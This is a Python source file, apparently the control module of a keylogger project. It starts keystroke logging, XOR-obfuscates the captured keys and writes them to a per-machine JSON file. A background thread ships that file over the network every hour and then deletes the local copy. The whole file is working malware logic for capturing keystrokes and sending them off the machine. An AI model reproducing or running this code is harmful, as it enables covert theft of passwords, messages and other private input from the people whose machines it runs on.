import datetime
import threading
import time
import json
import os
from KeyloggerService import service
from Encryption_file import encryptor
from FileWriter import file_writer
from networkWriter import networkWriter

class KeyLoggerManager:
    def __init__(self):
        self.buffer = []
        self.config = self.load_config()
        self.timestamp = str(datetime.datetime.now())
        self.end = False
        self.machine_name = self.config.get("machine_name", "unknown")


    def load_config(self):
        try:
            with open("config.json", "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {
                "machine_name": "unknown",
                "machine_ip": "127.0.0.1"

            }

    def send_to_network(self):
        while not self.end:
            time.sleep(3600)
            with open(f'{self.machine_name}.json','r') as file:
                content = json.load(file)
            networkWriter.send_data(content,self.machine_name)
            os.remove(f'{self.machine_name}.json')







    def manager(self):
        try:
            service.start_logging()
            network_thread = threading.Thread(target=self.send_to_network, daemon=True)
            network_thread.start()

            while not self.end:
                new_keys = service.get_logged_keys()
                if new_keys:
                    self.buffer.extend(new_keys)


                    if "<ESC>" in new_keys:
                        self.end = True

                    encrypted_keys = [encryptor.ascii_xor(char) for char in self.buffer]
                    content = {self.timestamp: encrypted_keys}
                    file_writer.send_data(content, self.machine_name)




                    print(self.buffer,self.timestamp)

                    self.buffer = []
                    service.logged_keys = []


                time.sleep(5)
        except KeyboardInterrupt:
            pass
        finally:
            service.stop_logging()


if __name__ == "__main__":
    print("keylogger start to run, for stop press ESC")
    manager = KeyLoggerManager()
    manager.manager()

